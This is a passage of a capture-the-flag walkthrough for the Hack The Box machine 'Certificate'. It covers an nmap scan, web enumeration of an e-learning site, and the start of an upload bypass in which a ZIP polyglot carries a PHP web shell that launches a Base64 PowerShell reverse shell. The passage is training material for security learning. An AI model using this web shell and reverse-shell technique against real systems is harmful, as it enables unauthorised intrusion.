---
title: Certificate
date: 2025-10-4
categories: [HTB Walkthrough]
tags: Windows Web xampp MsSql Krb5Roast ADCS GoldenTicket
img_path: /assets/HTB/Certificate/image1.png
image:
  path: /assets/HTB/Certificate/image1.png
---

<table style="width:100%; table-layout:fixed; text-align:center;">
  <tr>
    <th>Machine</th>
    <th>Difficulty</th>
    <th>OS</th>
    <th>Release</th>
    <th></th>
  </tr>
  <tr>
    <td>Certificate</td>
    <td>Hard</td>
    <td>Windows</td>
    <td>01 Jun 2025</td>
    <td><img src="/assets/HTB/Certificate/logo.png" alt="Logo" width="80"></td>
  </tr>
</table>


## Recon

Start of with Nmap Scan

```
IP=10.10.11.71

# Find open ports (fast full-port scan) and build a comma-separated list
port=$(sudo nmap -p- $IP --min-rate 10000 | grep open | cut -d'/' -f1 | tr '\n' ',' )

# Run an Nmap service/version scan with default scripts against discovered ports
sudo nmap -sC -sV -vv -p $port $IP -oN certificate.scan
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 05:52 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:52
Completed NSE at 05:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:52
Completed NSE at 05:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:52
Completed NSE at 05:52, 0.00s elapsed
Initiating Ping Scan at 05:52
Scanning 10.10.11.71 [4 ports]
Completed Ping Scan at 05:52, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:52
Completed Parallel DNS resolution of 1 host. at 05:52, 0.00s elapsed
Initiating SYN Stealth Scan at 05:52
Scanning 10.10.11.71 [21 ports]
Discovered open port 135/tcp on 10.10.11.71
Discovered open port 139/tcp on 10.10.11.71
Discovered open port 80/tcp on 10.10.11.71
Discovered open port 53/tcp on 10.10.11.71
Discovered open port 445/tcp on 10.10.11.71
Discovered open port 49689/tcp on 10.10.11.71
Discovered open port 9389/tcp on 10.10.11.71
Discovered open port 593/tcp on 10.10.11.71
Discovered open port 49692/tcp on 10.10.11.71
Discovered open port 389/tcp on 10.10.11.71
Discovered open port 49667/tcp on 10.10.11.71
Discovered open port 49713/tcp on 10.10.11.71
Discovered open port 49707/tcp on 10.10.11.71
Discovered open port 636/tcp on 10.10.11.71
Discovered open port 5985/tcp on 10.10.11.71
Discovered open port 49732/tcp on 10.10.11.71
Discovered open port 49690/tcp on 10.10.11.71
Discovered open port 3268/tcp on 10.10.11.71
Discovered open port 3269/tcp on 10.10.11.71
Discovered open port 88/tcp on 10.10.11.71
Discovered open port 464/tcp on 10.10.11.71
Completed SYN Stealth Scan at 05:52, 0.52s elapsed (21 total ports)
Initiating Service scan at 05:52
Scanning 21 services on 10.10.11.71
Completed Service scan at 05:53, 58.05s elapsed (21 services on 1 host)
NSE: Script scanning 10.10.11.71.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:53
NSE Timing: About 99.97% done; ETC: 05:53 (0:00:00 remaining)
Completed NSE at 05:53, 40.23s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 3.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
Nmap scan report for 10.10.11.71
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2025-10-04 05:52:16 EDT for 103s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-04 17:52:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T19:51:30
| Not valid after:  2026-10-03T19:51:30
| MD5:   4342:226a:144f:5de3:d4a2:2e33:3bef:9b28
| SHA-1: 0e36:4eee:32cd:0b5f:f481:1e01:17ee:6520:7739:3103
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAABj/YVrbl3kscQAAAAAAGDANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNTEwMDMxOTUx
| MzBaFw0yNjEwMDMxOTUxMzBaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIfu3iy2riEDEGJf
| MyauOyWs61rnOzs1VTCotCBMsf56w01kvY/eUVe0+nzd7u9zqGgdFuMBWq2482ef
| 6QEt9ba3jbo22cJkdS+/pAiO1K5s+cQmaSZ+GSpJOPJrNtK4ZDkEcIQGJeaBUNP+
| n34RVTUJxfzCeUeSQQPCz6yBbAvModAqUWiFasTePw2Kxt1D6y2/59JPN88iH2j3
| 4zcBK7OUE7TUes591a6qdgZ4CWBaoyVp8WOPm7YdMoB0Qw2FejWZDh6agG2ZP9Z+
| 1e6IYwP+OzJd2FbKnpGpWL3ImXKDeyhRkX0v3LWOwwbVqVonNOP4NgJx1X0EyHAP
| cvXYaQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzBOBgkr
| BgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtNTE1NTM3NjY5
| LTQyMjM2ODcxOTYtMzI0OTY5MDU4My0xMDAwMEAGA1UdEQQ5MDegHwYJKwYBBAGC
| NxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2VydGlmaWNhdGUuaHRiMB0G
| A1UdDgQWBBRoKzp6gpXRf4sPitxex+b8/yuUuDAfBgNVHSMEGDAWgBQ64fdRbe+t
| Shh3QaO7u4XmbpRzojCB0QYDVR0fBIHJMIHGMIHDoIHAoIG9hoG6bGRhcDovLy9D
| Tj1DZXJ0aWZpY2F0ZS1MVEQtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1j
| ZXJ0aWZpY2F0ZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNl
| P29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHIBggrBgEFBQcBAQSB
| uzCBuDCBtQYIKwYBBQUHMAKGgahsZGFwOi8vL0NOPUNlcnRpZmljYXRlLUxURC1D
| QSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1jZXJ0aWZpY2F0ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJ
| KoZIhvcNAQELBQADggEBAIg822zMA962RVTV/89kqTam/PXn2vsxz4Xejcsnbaoq
| maU9S3ANppzGLOnPaGH/N0m/SFqtkzQn4oU3UhFRTlPxay1oV/+618E1XFCUd3/2
| aFSH5DAgDBTiq0lKlRWLPpLzwlgwexsy53EuxjrVy9p/TJiLiaNqmsm1sMH6yLgm
| 80s/DIMjfgPp3vo3emtrwjCcK0H8rNOTIVLNXDbfVzvhqoxJZdJ4aR8vejYI/ovt
| 3KuP3Xm57ROI9Hft7Ro8JRhYZsRYGha0usr8YIPNrG5XzpMEWYB+u9hFUHCpGmsr
| BKUozIHj2A3VPYkCbXbHZBsJqN9rQHxLCNuON1Kn2cU=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-04T17:54:11+00:00; +8h00m14s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T17:54:12+00:00; +8h00m14s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T19:51:30
| Not valid after:  2026-10-03T19:51:30
| MD5:   4342:226a:144f:5de3:d4a2:2e33:3bef:9b28
| SHA-1: 0e36:4eee:32cd:0b5f:f481:1e01:17ee:6520:7739:3103
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAABj/YVrbl3kscQAAAAAAGDANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNTEwMDMxOTUx
| MzBaFw0yNjEwMDMxOTUxMzBaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIfu3iy2riEDEGJf
| MyauOyWs61rnOzs1VTCotCBMsf56w01kvY/eUVe0+nzd7u9zqGgdFuMBWq2482ef
| 6QEt9ba3jbo22cJkdS+/pAiO1K5s+cQmaSZ+GSpJOPJrNtK4ZDkEcIQGJeaBUNP+
| n34RVTUJxfzCeUeSQQPCz6yBbAvModAqUWiFasTePw2Kxt1D6y2/59JPN88iH2j3
| 4zcBK7OUE7TUes591a6qdgZ4CWBaoyVp8WOPm7YdMoB0Qw2FejWZDh6agG2ZP9Z+
| 1e6IYwP+OzJd2FbKnpGpWL3ImXKDeyhRkX0v3LWOwwbVqVonNOP4NgJx1X0EyHAP
| cvXYaQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzBOBgkr
| BgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtNTE1NTM3NjY5
| LTQyMjM2ODcxOTYtMzI0OTY5MDU4My0xMDAwMEAGA1UdEQQ5MDegHwYJKwYBBAGC
| NxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2VydGlmaWNhdGUuaHRiMB0G
| A1UdDgQWBBRoKzp6gpXRf4sPitxex+b8/yuUuDAfBgNVHSMEGDAWgBQ64fdRbe+t
| Shh3QaO7u4XmbpRzojCB0QYDVR0fBIHJMIHGMIHDoIHAoIG9hoG6bGRhcDovLy9D
| Tj1DZXJ0aWZpY2F0ZS1MVEQtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1j
| ZXJ0aWZpY2F0ZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNl
| P29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHIBggrBgEFBQcBAQSB
| uzCBuDCBtQYIKwYBBQUHMAKGgahsZGFwOi8vL0NOPUNlcnRpZmljYXRlLUxURC1D
| QSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1jZXJ0aWZpY2F0ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJ
| KoZIhvcNAQELBQADggEBAIg822zMA962RVTV/89kqTam/PXn2vsxz4Xejcsnbaoq
| maU9S3ANppzGLOnPaGH/N0m/SFqtkzQn4oU3UhFRTlPxay1oV/+618E1XFCUd3/2
| aFSH5DAgDBTiq0lKlRWLPpLzwlgwexsy53EuxjrVy9p/TJiLiaNqmsm1sMH6yLgm
| 80s/DIMjfgPp3vo3emtrwjCcK0H8rNOTIVLNXDbfVzvhqoxJZdJ4aR8vejYI/ovt
| 3KuP3Xm57ROI9Hft7Ro8JRhYZsRYGha0usr8YIPNrG5XzpMEWYB+u9hFUHCpGmsr
| BKUozIHj2A3VPYkCbXbHZBsJqN9rQHxLCNuON1Kn2cU=
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T17:54:11+00:00; +8h00m14s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T19:51:30
| Not valid after:  2026-10-03T19:51:30
| MD5:   4342:226a:144f:5de3:d4a2:2e33:3bef:9b28
| SHA-1: 0e36:4eee:32cd:0b5f:f481:1e01:17ee:6520:7739:3103
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAABj/YVrbl3kscQAAAAAAGDANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNTEwMDMxOTUx
| MzBaFw0yNjEwMDMxOTUxMzBaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIfu3iy2riEDEGJf
| MyauOyWs61rnOzs1VTCotCBMsf56w01kvY/eUVe0+nzd7u9zqGgdFuMBWq2482ef
| 6QEt9ba3jbo22cJkdS+/pAiO1K5s+cQmaSZ+GSpJOPJrNtK4ZDkEcIQGJeaBUNP+
| n34RVTUJxfzCeUeSQQPCz6yBbAvModAqUWiFasTePw2Kxt1D6y2/59JPN88iH2j3
| 4zcBK7OUE7TUes591a6qdgZ4CWBaoyVp8WOPm7YdMoB0Qw2FejWZDh6agG2ZP9Z+
| 1e6IYwP+OzJd2FbKnpGpWL3ImXKDeyhRkX0v3LWOwwbVqVonNOP4NgJx1X0EyHAP
| cvXYaQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzBOBgkr
| BgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtNTE1NTM3NjY5
| LTQyMjM2ODcxOTYtMzI0OTY5MDU4My0xMDAwMEAGA1UdEQQ5MDegHwYJKwYBBAGC
| NxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2VydGlmaWNhdGUuaHRiMB0G
| A1UdDgQWBBRoKzp6gpXRf4sPitxex+b8/yuUuDAfBgNVHSMEGDAWgBQ64fdRbe+t
| Shh3QaO7u4XmbpRzojCB0QYDVR0fBIHJMIHGMIHDoIHAoIG9hoG6bGRhcDovLy9D
| Tj1DZXJ0aWZpY2F0ZS1MVEQtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1j
| ZXJ0aWZpY2F0ZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNl
| P29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHIBggrBgEFBQcBAQSB
| uzCBuDCBtQYIKwYBBQUHMAKGgahsZGFwOi8vL0NOPUNlcnRpZmljYXRlLUxURC1D
| QSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1jZXJ0aWZpY2F0ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJ
| KoZIhvcNAQELBQADggEBAIg822zMA962RVTV/89kqTam/PXn2vsxz4Xejcsnbaoq
| maU9S3ANppzGLOnPaGH/N0m/SFqtkzQn4oU3UhFRTlPxay1oV/+618E1XFCUd3/2
| aFSH5DAgDBTiq0lKlRWLPpLzwlgwexsy53EuxjrVy9p/TJiLiaNqmsm1sMH6yLgm
| 80s/DIMjfgPp3vo3emtrwjCcK0H8rNOTIVLNXDbfVzvhqoxJZdJ4aR8vejYI/ovt
| 3KuP3Xm57ROI9Hft7Ro8JRhYZsRYGha0usr8YIPNrG5XzpMEWYB+u9hFUHCpGmsr
| BKUozIHj2A3VPYkCbXbHZBsJqN9rQHxLCNuON1Kn2cU=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T17:54:12+00:00; +8h00m14s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-03T19:51:30
| Not valid after:  2026-10-03T19:51:30
| MD5:   4342:226a:144f:5de3:d4a2:2e33:3bef:9b28
| SHA-1: 0e36:4eee:32cd:0b5f:f481:1e01:17ee:6520:7739:3103
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAABj/YVrbl3kscQAAAAAAGDANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNTEwMDMxOTUx
| MzBaFw0yNjEwMDMxOTUxMzBaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIfu3iy2riEDEGJf
| MyauOyWs61rnOzs1VTCotCBMsf56w01kvY/eUVe0+nzd7u9zqGgdFuMBWq2482ef
| 6QEt9ba3jbo22cJkdS+/pAiO1K5s+cQmaSZ+GSpJOPJrNtK4ZDkEcIQGJeaBUNP+
| n34RVTUJxfzCeUeSQQPCz6yBbAvModAqUWiFasTePw2Kxt1D6y2/59JPN88iH2j3
| 4zcBK7OUE7TUes591a6qdgZ4CWBaoyVp8WOPm7YdMoB0Qw2FejWZDh6agG2ZP9Z+
| 1e6IYwP+OzJd2FbKnpGpWL3ImXKDeyhRkX0v3LWOwwbVqVonNOP4NgJx1X0EyHAP
| cvXYaQIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzBOBgkr
| BgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtNTE1NTM3NjY5
| LTQyMjM2ODcxOTYtMzI0OTY5MDU4My0xMDAwMEAGA1UdEQQ5MDegHwYJKwYBBAGC
| NxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2VydGlmaWNhdGUuaHRiMB0G
| A1UdDgQWBBRoKzp6gpXRf4sPitxex+b8/yuUuDAfBgNVHSMEGDAWgBQ64fdRbe+t
| Shh3QaO7u4XmbpRzojCB0QYDVR0fBIHJMIHGMIHDoIHAoIG9hoG6bGRhcDovLy9D
| Tj1DZXJ0aWZpY2F0ZS1MVEQtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1j
| ZXJ0aWZpY2F0ZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNl
| P29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHIBggrBgEFBQcBAQSB
| uzCBuDCBtQYIKwYBBQUHMAKGgahsZGFwOi8vL0NOPUNlcnRpZmljYXRlLUxURC1D
| QSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1jZXJ0aWZpY2F0ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJ
| KoZIhvcNAQELBQADggEBAIg822zMA962RVTV/89kqTam/PXn2vsxz4Xejcsnbaoq
| maU9S3ANppzGLOnPaGH/N0m/SFqtkzQn4oU3UhFRTlPxay1oV/+618E1XFCUd3/2
| aFSH5DAgDBTiq0lKlRWLPpLzwlgwexsy53EuxjrVy9p/TJiLiaNqmsm1sMH6yLgm
| 80s/DIMjfgPp3vo3emtrwjCcK0H8rNOTIVLNXDbfVzvhqoxJZdJ4aR8vejYI/ovt
| 3KuP3Xm57ROI9Hft7Ro8JRhYZsRYGha0usr8YIPNrG5XzpMEWYB+u9hFUHCpGmsr
| BKUozIHj2A3VPYkCbXbHZBsJqN9rQHxLCNuON1Kn2cU=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 49602/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 15156/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-04T17:53:32
|_  start_date: N/A
|_clock-skew: mean: 8h00m13s, deviation: 0s, median: 8h00m13s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.32 seconds
           Raw packets sent: 25 (1.076KB) | Rcvd: 22 (952B)

```

The Nmap scan revealed that the target hosts both an **Active Directory environment** and a **web service**. The numerous AD-related ports confirm a Windows domain setup, while port 80 hosts a website accessible at `http://certificate.htb/`.


Before proceeding, we update the `/etc/hosts` file to resolve the domain properly.

```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ netexec smb 10.10.11.71 --generate-hosts-file certificate-hosts
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ cat certificate-hosts 
10.10.11.71     DC01.certificate.htb certificate.htb DC01
                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ sudo tee -a /etc/hosts < certificate-hosts

10.10.11.71     DC01.certificate.htb certificate.htb DC01
```

## Enumeration

here we have a webserver running on port 80

```
http://certificate.htb/
```

<img src="/assets/HTB/Certificate/image2.png" alt="Error loading image">

The website appears to be an **e-learning platform** offering online courses, certifications, and educational resources. It provides features such as video classes, e-books, assignments, and recognized certificates to help users enhance their skills.

First, we register on the platform:

```
http://certificate.htb/register.php
```

<img src="/assets/HTB/Certificate/image3.png" alt="Error loading image">

Then, log in to the application:

```
http://certificate.htb/login.php
```

<img src="/assets/HTB/Certificate/image4.png" alt="Error loading image">

Next, we explore the available courses:

```
http://certificate.htb/courses.php
```

Here, we can view and enroll in different courses.

<img src="/assets/HTB/Certificate/image4.1.png" alt="Error loading image">

To view course details and enroll:

```
http://certificate.htb/course-details.php?id=1
```

Click **Enroll** to join the course.

<img src="/assets/HTB/Certificate/image4.2.png" alt="Error loading image">

After enrolling, scrolling down reveals different sessions and a submission section.

```
http://certificate.htb/course-details.php?id=1&action=enroll
```

<img src="/assets/HTB/Certificate/image4.3.png" alt="Error loading image">

Clicking on **Submission** leads to a file upload page that accepts only specific file types:

```
We accept only the following file types: .pdf, .docx, .pptx, .xlsx

http://certificate.htb/upload.php?s_id=26
```

Here, uploading a normal PDF shows **"File uploaded successfully"** and provides a link to view the submitted assignment:

<img src="/assets/HTB/Certificate/image5.png" alt="Error loading image">


Here after trying different type of file upload finally i found a upload a shell

## ZIP-overlay (polyglot) upload — Initial access via web shell

**Overview:** by creating a ZIP/polyglot archive that contains both a benign PDF and a PHP web shell, the application accepted the upload and stored the shell, allowing initial code execution.

#### Preparation (create a sample PDF)

- Create a simple text file and convert it to PDF:

```bash
echo "hello world" > newfile.txt
pandoc newfile.txt -o normal.pdf
```

- Create a benign ZIP containing the PDF:

```bash
zip benign.zip normal.pdf
```

- Create a PHP file containing a PowerShell reverse shell that uses the Base64 payload from [Revshells](https://www.revshells.com/) (PowerShell #3 — Base64).


```bash
<?php
shell_exec("powershell -e JABjAGwAaQBlAG4.....kAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
?>
```

- Archive the malicious file:

```bash
zip malicious.zip normal.php
```


